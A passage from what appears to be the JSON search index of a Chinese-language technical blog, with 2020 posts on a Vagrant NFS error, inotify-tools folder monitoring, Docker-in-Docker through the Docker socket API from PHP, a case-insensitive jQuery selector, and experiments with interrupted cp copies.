be found. Attempting to find and install... master: Box Provider: virtualbox master: Box Version: = 2345.0.0 ==\u003e master: Loading metadata for box 'http://alpha.release.core-os.net/amd64-usr/current/coreos_production_vagrant.json' master: URL: http://alpha.release.core-os.net/amd64-usr/current/coreos_production_vagrant.json ==\u003e master: Adding box 'coreos-alpha' (v2345.0.0) for provider: virtualbox master: Downloading: https://alpha.release.core-os.net/amd64-usr/2345.0.0/coreos_production_vagrant.box master: Calculating and comparing box checksum... ==\u003e master: Successfully added box 'coreos-alpha' (v2345.0.0) for 'virtualbox'! ==\u003e master: Importing base box 'coreos-alpha'... ==\u003e master: Matching MAC address for NAT networking... ==\u003e master: Checking if box 'coreos-alpha' version '2345.0.0' is up to date... ==\u003e master: Setting the name of the VM: kubernetes-vagrant-coreos-cluster_master_1579011179473_57219 It appears your machine doesn't support NFS, or there is not an adapter to enable NFS on this machine for Vagrant. Please verify that `nfsd` is installed on your machine, and try again. If you're on Windows, NFS isn't supported. If the problem persists, please contact Vagrant support. 解決方是 sudo apt-get install nfs-common nfs-kernel-server Simplified install with vagrant_xuxiao1991101的博客-CSDN博客 ","date":"2020-01-12","objectID":"/blog/posts/Kubernetes-%E9%9B%9C%E8%A8%98/:1:0","tags":["k8s"],"title":"Kubernetes 雜記","uri":"/blog/posts/Kubernetes-%E9%9B%9C%E8%A8%98/"},{"categories":["實用工具"],"content":"最近做到大檔案處理方式 由於資料太多，程式在掃整個檔案目錄就花費很多時間 在想有什麼工具可以監聽資料夾這個動作 後來有找到 inotify-tools 可以做到 這邊就小記 ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:0:0","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"安裝 sudo apt install inotify-tools ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:1:0","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"Linux 指令 監聽 /home 資料夾目錄(文件的訪問，寫入，修改，刪除) ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:2:0","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"inotifywait inotifywait -rm /home note: -r 遞迴目錄都會接收到監聽 -m 收到監聽異動會持續監聽，不會停止 ls 資料夾也會收到訊息 ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:2:1","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"inotifywatch inotifywatch -v -e access -e modify -t 60 -r /home Establishing watches… Setting up watch(es) on /home OK, /home is now being watched. Total of 5 watches. Finished establishing watches, now collecting statistics. Will listen for events for 30 seconds. total access modify filename 13 3 10 /home/vagrant/ 監聽access（文件讀取)、modify(文件更改)檔案做統計個數 NOTE: -v 顯示訊息 -e 要監聽的事件 -t 監聽幾秒鐘 -r 遞迴目錄都會接收到監聽 ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:2:2","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"相關指令設定 inotifywait 語法： inotifywait [-hcmrq] [-e ] [-t ] [–format ] [–timefmt ] [ … ] 參數： -h,–help 輸出幫助信息 @ 排除不需要監視的文件，可以是相對路徑，也可以是絕對路徑。 –fromfile 從文件讀取需要監視的文件或排除的文件，一個文件一行，排除的文件以@開頭。 -m, –monitor 接收到一個事情而不退出，無限期地執行。默認的行為是接收到一個事情後立即退出。 -d, –daemon 跟–monitor一樣，除了是在後台運行，需要指定–outfile把事情輸出到一個文件。也意味著使用了–syslog。 -o, –outfile 輸出事情到一個文件而不是標準輸出。 -s, –syslog 輸出錯誤信息到系統日誌 -r, –recursive 監視一個目錄下的所有子目錄。 -q, –quiet 指定一次，不會輸出詳細信息，指定二次，除了致命錯誤，不會輸出任何信息。 –exclude 正則匹配需要排除的文件，大小寫敏感。 –excludei 正則匹配需要排除的文件，忽略大小寫。 -t , –timeout 設置超時時間，如果為0，則無限期地執行下去。 -e , –event 指定監視的事件。 -c, –csv 輸出csv格式。 –timefmt 指定時間格式，用於–format選項中的%T格式。 –format 指定輸出格式。 %w 表示發生事件的目錄 %f 表示發生事件的文件 %e 表示發生的事件 %Xe 事件以「X」分隔 %T 使用由–timefmt定義的時間格式 inotifywatch 語法： inotifywatch [-hvzrqf] [-e ] [-t ] [-a ] [-d ] [ … ] 參數： -h, –help 輸出幫助信息 -v, –verbose 輸出詳細信息 @ 排除不需要監視的文件，可以是相對路徑，也可以是絕對路徑。 –fromfile 從文件讀取需要監視的文件或排除的文件，一個文件一行，排除的文件以@開頭。 -z, –zero 輸出表格的行和列，即使元素為空 –exclude 正則匹配需要排除的文件，大小寫敏感。 –excludei 正則匹配需要排除的文件，忽略大小寫。 -r, –recursive 監視一個目錄下的所有子目錄。 -t , –timeout 設置超時時間 -e , –event 只監聽指定的事件。 -a , –ascending 以指定事件升序排列。 -d , –descending 以指定事件降序排列。 access 文件讀取 modify 文件更改。 attrib 文件屬性更改，如權限，時間戳等。 close_write 以可寫模式打開的文件被關閉，不代表此文件一定已經寫入數據。 close_nowrite 以只讀模式打開的文件被關閉。 close 文件被關閉，不管它是如何打開的。 open 文件打開。 moved_to 一個文件或目錄移動到監聽的目錄，即使是在同一目錄內移動，此事件也觸發。 moved_from 一個文件或目錄移出監聽的目錄，即使是在同一目錄內移動，此事件也觸發。 move 包括moved_to和 moved_from move_self 文件或目錄被移除，之後不再監聽此文件或目錄。 create 文件或目錄創建 delete 文件或目錄刪除 delete_self 文件或目錄移除，之後不再監聽此文件或目錄 unmount 文件系統取消掛載，之後不再監聽此文件系統。 資料來源: inotify-tools使用方法介紹-Linux運維日誌 ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:2:3","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"相關 inotify 設定 3、參數說明 max_user_instances：每個用戶創建inotify實例最大值 max_queued_events：inotify隊列最大長度，如果值太小，會出現錯誤，導致監控文件不準確 max_user_watches：要知道同步的文件包含的目錄數，可以用： [root@localhost]# find /home/rain -type d|wc -l 統計，必須保證參數值大於統計結果（/home/tan/uploadFile/為同步文件目錄）。 查看設定 sysctl -a | grep max_queued_events #fs.inotify.max_queued_events = 16384 sysctl -a | grep max_user_watches #fs.inotify.max_user_watches = 8192 #fs.epoll.max_user_watches = 798863 sysctl -a | grep max_user_instances #fs.inotify.max_user_instances = 128 五、修改inotify參數 1、命令修改 [root@localhost bin]# sysctl -w fs.inotify.max_user_instances=130 fs.inotify.max_user_instances = 130 2、文件修改 [root@localhost]# vi /etc/sysctl.conf #添加如下代碼 fs.inotify.max_user_instances=130 資料來源: CentOS 6.9上inotify-tools 安裝及使用方法 - 1felse筆記 ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:3:0","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"相關串接方法 rsync + inotify-tools 實現 Linux 文件雙向實時同步 – Jacky’s Blog 監聽實作 rsync 方法 PHP用inotify擴展監控文件_chunyuan314的博客-CSDN博客 發現 PHP 有擴充外掛可以使用 inotify-tools + php腳本實現Linux服務器文件監控並郵件提醒 - 黃小濤 - 博客園 跟上面 PHP 不太一樣 這邊他是用 inotify 寫入 log 方式去做比較是否異動 Rsync+Inotify 搭建實時同步數據 ‧ Jusene’s Blog 數據同步工具-RSYNC結合INOTIFY-TOOLS實現數據實時同步 | DevOpsSec 覺得這兩篇也寫得不錯 ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:4:0","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"小小實驗 cp 複製檔案可能沒注意的事情 | 程式狂想筆記 實驗一下複製大檔案當下狀況 是忽看到 CLOSE_WRITE 做複製動作會比較安全 看了一下 -e close_write,delete,create,attrib -e close_write,delete,moved_to 我看其他篇文章有下這個 這樣真的用 close_write 比較安全 /home/vagrant/vv/ CREATE file.txt /home/vagrant/vv/ OPEN file.txt /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ MODIFY file.txt ... /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ MODIFY file.txt /home/vagrant/vv/ CLOSE_WRITE,CLOSE file.txt ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:5:0","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"總結 我本來想找找網路上有沒有搭配 inotify-tools 做 RabbitMQ 動作 是有找到 sof-object-listing/inotify at master · prashanthpai/sof-object-listing，但未確認是不是能真的用 大多是做 Web 監聽檔案 和 資料同步 居多 但是 inotify-tools 看起來也有接收大量打案也有極限 不知道是不是一個好的解決方式 也要看其況 ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:6:0","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"相關連結 inotify-tools使用方法介紹-Linux運維日誌 備份圖 CentOS 6.9上inotify-tools 安裝及使用方法 - 1felse筆記 備份圖 rsync + inotify-tools 實現 Linux 文件雙向實時同步 – Jacky’s Blog 備份圖 安全组应用案例_安全组_安全_云服务器 ECS-阿里云 備份圖 PHP用inotify擴展監控文件_chunyuan314的博客-CSDN博客 inotifywait命令_Linux inotifywait 命令用法詳解：異步文件系統監控機制 inotify-tools + php腳本實現Linux服務器文件監控並郵件提醒 - 黃小濤 - 博客園 備份圖 Rsync+Inotify 搭建實時同步數據 ‧ Jusene’s Blog 備份圖 數據同步工具-RSYNC結合INOTIFY-TOOLS實現數據實時同步 | DevOpsSec 備份圖 彩蛋 突然想到上次研究 Oauth API 發現有些token 能做到時效性 但一直沒有時間紀錄 看到有一篇說 token 時效性問題 突然想到這樣不就會買台時間不一樣的問題 但後來發現原來 oauth 傳的時間是 duration 時間 所以不會有這個問題 開發者必備知識 - HTTP認證（HTTP Authentication） - Carson’s Tech Note thephpleague/oauth2-server: A spec compliant, secure by default PHP OAuth 2.0 Server 揭秘Token的工作原理 | Crazy’s Blog 微服務架構 #4, 如何強化微服務的安全性? API Token / JWT 的應用 — 安德魯的部落格 備份圖 Token 认证的来龙去脉 - 掘金 iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 RSA數位簽章的簡單流程 | Litfal的S/L中心 - 點部落 [PHP] 範例實做 RSA, 公鑰、私鑰非對稱加密、解密演算法 - 串接 iOS,Android - 工作玩樂實驗室 OAuth2 認證機制 Token 原理 - 科技新人 非对称加密RSA详解 | Wuman’s Blog rsync異地增量備份　資料同步無落差 | 網管人 Script - 使用 inotifywait 監控資料夾並上傳到s3 .sh sysboss/inotify_s3: Bash: Inotify files sync to Amazon S3 Cloud ","date":"2020-01-12","objectID":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/:7:0","tags":["linux"],"title":"inotify-tools 監聽資料夾裡檔案異動工具","uri":"/blog/posts/inotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7/"},{"categories":["Docker"],"content":"最近做大量資料處理 我想使用 RabbitMQ 處理大量資料 不過這個方式 RabbitMQ 會遇到 Work 需要一開始常駐 不能做到自動調整控制 Work 數量 所已採用 DinD 觀念去實作 DIND 就是 Docker in Docker docker run --rm -v /var/run/docker.sock:/var/run/docker.sock docker:latest version 然後容器裡面的 Container 可以跟 docker.sock 做溝通 相關可以控制方法 (Docker ) Examples using the Docker Engine SDKs and Docker API | Docker Documentation 关于/var/run/docker.sock | Fundebug博客 - 一行代码搞定BUG监控 - 网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source Map|用户行为|可视化重现 更多 Unix-socket 方式可以參考 Engine API v1.24 | Docker Documentation Docker Engine API v1.40 Reference 看到這個方式突然想到之前 COSCUP 有看到 Serverless 方式去做 Philipz Docker Lab. - Serverless 架構 \u0026 Docker Building serverless apps with Docker - Docker Blog 無伺服器架構 - 壹讀 bfirsh/serverless-docker: Build serverless apps with Docker bfirsh/serverless-docker-voting-app: A serverless web app built with Docker 技术|用 Docker 创建 serverless 应用 但由於要限制 docker 執行數量 可以使用 Redis 用程式邏輯限制數量 不過要如何實作，這篇不是重點 ","date":"2020-01-12","objectID":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:0:0","tags":["docker","rabbitmq"],"title":"Docker in Docker (DinD) 和 RabbitMQ 解決大量資料方法小記","uri":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["Docker"],"content":"php 使用 socket 方式連 docker 參考官網文章 PHP: stream_socket_client - Manual Examples using the Docker Engine SDKs and Docker API | Docker Documentation curl --unix-socket /var/run/docker.sock -H \"Content-Type: application/json\" \\ -d '{\"Image\": \"alpine\", \"Cmd\": [\"echo\", \"hello world\"]}' \\ -X POST http:/v1.24/containers/create 發現 curl 需要 7.4 以上才有 unix-socket 連結功能 但使用 php curl 沒有這個問題 可以看到以下參考 使用前請記得 docker pull alpine \u003c?php $file_p = stream_socket_client(\"unix:///var/run/docker.sock\", $errno, $errstr, 30); if (!$file_p) { echo \"$errstr ($errno)\u003cbr /\u003e\\n\"; } else { fwrite($file_p, \"POST /containers/create HTTP/1.1\\nHost: v1.24\\nContent-Type: application/json\\nContent-Length: 51\\nConnection: Close\\n\\n{\\\"Image\\\": \\\"alpine\\\", \\\"Cmd\\\": [\\\"echo\\\", \\\"hello world\\\"]}\"); while (!feof($file_p)) { echo fgets($file_p, 1024); } fclose($file_p); } ?\u003e Connection: Close 需要加，否則程式不會退出!! 仔細想想這樣也滿有道理，需要切斷 socket 連線 Content-Length 需要注意{\"Image\": \"alpine\", \"Cmd\": [\"echo\", \"hello world\"]}這個長度 不對的話會有問題 最後，程式用 DinD 要如何傳值到程式裡面，這也是一個不錯思考問題 畢竟會遇到跳脫字元(\\)，可能使用外部資源(file,mysql,redis)會是比較安全方式 如何用Telnet POST資料 對外 socket 連結可以改成 tcp 開頭 誤打誤撞，發現這個好像不錯工具就是要你懂Unix Socket 进行抓包解析 | plantegg備份圖 就是要你懂网络监控–ss用法大全 | plantegg 就是要你懂抓包–WireShark之命令行版tshark | plantegg ","date":"2020-01-12","objectID":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:0:1","tags":["docker","rabbitmq"],"title":"Docker in Docker (DinD) 和 RabbitMQ 解決大量資料方法小記","uri":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["Docker"],"content":"衍生問題 ","date":"2020-01-12","objectID":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:1:0","tags":["docker","rabbitmq"],"title":"Docker in Docker (DinD) 和 RabbitMQ 解決大量資料方法小記","uri":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["Docker"],"content":"RabbitMQ 的 worker 要如何關小保持關掉中程式可以正常結束 這個問題，我沒有在網路上爬到。 不過我自己想這個問題，在設計 worker 這條路應該要做到 已經做過 和 尚未執行成功 中斷程式 下次執行也能應該也要正常執行才對 ","date":"2020-01-12","objectID":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:1:1","tags":["docker","rabbitmq"],"title":"Docker in Docker (DinD) 和 RabbitMQ 解決大量資料方法小記","uri":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["Docker"],"content":"RabbitMQ 連續大量錯誤 如何優雅地在RabbitMQ實現失敗重試 - lala - Medium 備份圖 .net - How do I set a number of retry attempts in RabbitMQ? - Stack Overflow 其他問題想到再說 ","date":"2020-01-12","objectID":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:2:0","tags":["docker","rabbitmq"],"title":"Docker in Docker (DinD) 和 RabbitMQ 解決大量資料方法小記","uri":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["Docker"],"content":"rabbitmq 持久化 有 Queue 持久化 有 Message 持久化 ","date":"2020-01-12","objectID":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:3:0","tags":["docker","rabbitmq"],"title":"Docker in Docker (DinD) 和 RabbitMQ 解決大量資料方法小記","uri":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["Docker"],"content":"rabbitmq 定義 Queue 不能修改 ","date":"2020-01-12","objectID":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:4:0","tags":["docker","rabbitmq"],"title":"Docker in Docker (DinD) 和 RabbitMQ 解決大量資料方法小記","uri":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["Docker"],"content":"autoack 與 max- 可能要確定 autoack = true 時候， server 馬上發送 message 給 worker ?? 前言 · 轻松搞定RabbitMQ · 看云 Auto-Scaling Services Using Instrumented Metrics - Docker Flow Monitor Spring Boot RabbitMQ - priority queue ","date":"2020-01-12","objectID":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:5:0","tags":["docker","rabbitmq"],"title":"Docker in Docker (DinD) 和 RabbitMQ 解決大量資料方法小記","uri":"/blog/posts/Docker-in-Docker-DinD-%E5%92%8C-RabbitMQ-%E8%A7%A3%E6%B1%BA%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["JavaScript"],"content":"最近做單頁篩選某欄位資料 使用 jQuery contains selector 可以簡單實作 但發現 contains 沒法搜尋到大小寫不同的單字 就爬了一下 Google 紀錄一下 參考如下方法 Make jQuery :contains Case-Insensitive | CSS-Tricks jquery :contains case-Insensitive - JSFiddle $.extend($.expr[\":\"], { \"containsIN\": function(elem, i, match, array) { return (elem.textContent || elem.innerText || \"\").toLowerCase().indexOf((match[3] || \"\").toLowerCase()) \u003e= 0; } }); 可以用$('td:containsIN(\"'+value+'\")') 抓到你要的資料 非常簡單 ","date":"2020-01-11","objectID":"/blog/posts/jQuery-contains-%E5%8F%AF%E4%BB%A5%E6%8A%93%E5%A4%A7%E5%B0%8F%E5%AF%AB%E7%9A%84%E6%96%B9%E6%B3%95/:0:0","tags":["jquery"],"title":"jQuery contains 可以抓大小寫的方法","uri":"/blog/posts/jQuery-contains-%E5%8F%AF%E4%BB%A5%E6%8A%93%E5%A4%A7%E5%B0%8F%E5%AF%AB%E7%9A%84%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最近由於程式做很多檔案處理 就在想 cp 到目的資料夾裡面 ls 是否能看到資料 不過原本猜應該不會 但實驗結果卻不是我想得這樣 最後感覺我們被 GUI 介面受很多影響 其實是無聊探討一些不重要的事情(哈哈) ","date":"2020-01-10","objectID":"/blog/posts/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:0:0","tags":["cp","linux"],"title":"cp 複製檔案可能沒注意的事情","uri":"/blog/posts/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Linux"],"content":"產生大檔案 由於我用 PI 效能較差的電腦產生大檔案 dd if=/dev/zero of=file.txt count=1024 bs=1024 # 產生 1MB dd if=/dev/zero of=file.txt count=1024000 bs=1024 # 產生 1G 參考: How To Quickly Generate A Large File On The Command Line (With Linux) - Skorks ","date":"2020-01-10","objectID":"/blog/posts/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:1:0","tags":["cp","linux"],"title":"cp 複製檔案可能沒注意的事情","uri":"/blog/posts/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Linux"],"content":"簡單測試 其實就是把大檔案複製到別的資料夾 這邊先說正常沒中斷複製檔案中 目的資料夾檔案可以ls出來!!! 在想處理中檔案是否有別的方法隱藏 scp - Is there a way to tell if a file is done copying? - Super User 有找到更好方式在做紀錄 有趣結論 1 不過，我 Ctrl+C 竟然還會存在 這有點出乎我的意料 平常我們用 Window 桌面(不管是不是Linux)複製中檔案案取消都目的資料夾檔案一定會不見!!! 有趣結論 2 不管事做kill -9或kill -1都是不會刪除… 有趣結論 3 cp 檔案中…在別的 command line 做刪除動作 竟然 cp command line 指令不會中斷跳出錯誤… 但我想這種種跡象跟 Linux 檔案系統有關係 回想過去我們傳 FTP 跟 轉影音檔到一半中斷 我們檔案並不會刪除 我們在 Window 複製檔案中，我們 GUI 介面可以看到檔案圖示 但按取消後，圖示會跟著刪除 這我想是作業系統有幫我們做刪除動作 ","date":"2020-01-10","objectID":"/blog/posts/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:2:0","tags":["cp","linux"],"title":"cp 複製檔案可能沒注意的事情","uri":"/blog/posts/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["Linux"],"content":"最後 mv 我在想 mv 應該也是類似這樣 cp 完到別的地方，會做刪除動作馬上打臉 答案是錯的，同一個 HD 會很快(這應該跟作業系統有關係) 但不同 HD 跟我 cp 實驗一模一樣!!! 中斷會留檔案 至於 window 系統我就不研究了 又研究沒什麼軟用的實驗了 不相關彩蛋 預計 jQuery 和 inotify-tools 和 DinD(Docker in Docker) \u0026 RabbitMQ 要記錄…(我還記得的話之後會寫…怕忘記) Examples using the Docker Engine SDKs and Docker API | Docker Documentation 